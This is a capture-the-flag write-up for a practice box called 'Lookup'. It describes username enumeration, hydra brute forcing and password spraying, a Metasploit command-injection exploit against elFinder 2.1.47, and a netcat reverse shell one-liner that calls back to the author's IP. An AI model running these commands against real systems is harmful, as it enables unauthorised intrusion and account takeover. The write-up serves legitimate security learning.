# Lookup
(flags are at the end of the writeup)

### Lookup
Initial scan shows port 22 and 80 open: 

    # Nmap 7.94SVN scan initiated Wed Nov 27 17:24:12 2024 as: /usr/lib/nmap/nmap --privileged -p22,80 -sC -sV -oN scan 10.10.65.102
    Nmap scan report for lookup.thm (10.10.65.102)
    Host is up (0.061s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
    |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
    |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Login Page
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

If I try to access the webpage, I get redirected to `lookup.thm`:<br />
![image](https://github.com/user-attachments/assets/084acc68-fc20-4967-b497-99d031da7a78)<br />
So add the following line `10.10.65.102 lookup.thm` to the `/etc/hosts` file. It seems like a basic login page. If I try to access with basic credentials such as `admin:password`, I get the following response:<br />
![image](https://github.com/user-attachments/assets/c71eabe3-d2be-4cca-8991-91672308e8a7)<br />
Which is a weird way of handling errors. I tried `sqlmap` but nothig. I have to dig somewhere else.<br />
Next thing I try is to enumerate directories using gobuster: `gobuster dir -u lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt` but nothing was found. <br />
Now I try to enumerate subdomains. I found the subdomain `www.lookup.thm` but it's the same as `lookup.thm` so nothing there. Next, I noticed that if I tried looking with user `admin`, I get the reponse "Wrong password". But if I try to log in with, for example, "john", I get "Wrong username or password." This means that admin should be a valid user. So I try to login into the admin's account using bruteforce with hdyra: `hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"` and it finds something!<br />
![image](https://github.com/user-attachments/assets/d3a9e3c4-b445-4844-bbc6-d38ed1491c6b)<br />
Login fails.. but something strange happens, look:<br />
![image](https://github.com/user-attachments/assets/cec66cdd-cebc-4e4f-8685-5639592ea325)<br />
If I use credentials `admin:password123`, the server responds with "Wrong username or password", which is incoherent with the fact that admin is a valid user. This is really strange and I'm not sure why it behaves like that. But my guess is that it might do this for some server misconfiguration which shows this message if the password is a valid password! So the server might have this weird behaviour:

    1) if username and password are correct --> successful login
    2) if username is incorrect --> wrong username or password
    3) if username is correct but password doesn't exist on the DB --> wrong password
    4) if username is correct and password exists on the DB, but they don't match --> wrong username or password

I know, it's strange, but I don't have any other explanation for that. So since `password123` might be valid, let's try a password spraying attack! I'll bruteforce usernames using this password with hydra: <br />
![image](https://github.com/user-attachments/assets/b9781d2c-324f-47ca-b71d-aee99e19416c)<br />
I found a valid set of credentials! `jose:password123`. If I try to log in, I get redirected to `files.lookup.thm`, so let's add it on the /etc/hosts file.<br />
![image](https://github.com/user-attachments/assets/ff5d452a-3f5b-4b33-b7c2-994bad37727b)<br />
ElFinder is an opensource file management software that wants to offer a desktop-like experience. The version is `2.1.47`. Searching online, I found that this version is vulnerable to command injection, and the exploit is available on metasploit! So open `msfconsole` and run the exploit with the following commands:

    use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
    set lhost YOUR_IP
    set rhosts files.lookup.thm
    run

And it should open a meterpreter session. Now, I can't use metasploit, so I used the `shell` command to drop to a system shell, and then opened a reverse shell on another terminal because I really don't know how to use meterpreter very well, I need to do a tutorial. For the reverse shell I opened a netcat listener on my machine and then used then from the dropped shell I run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.90.188 5555 >/tmp/f`.
First thing I notice: the user `think` has the user flag, and inside his home directory I see a `.passwords` file that I can't read. So my guess is that I need to find a way to read that file. <br />
Using linpeas on the target system, I found an interesting binary that might be exploited:<br />
![image](https://github.com/user-attachments/assets/883cfbee-381e-4cee-953c-747b15f65b58)<br />



- What is the user flag?
- What is the root flag?
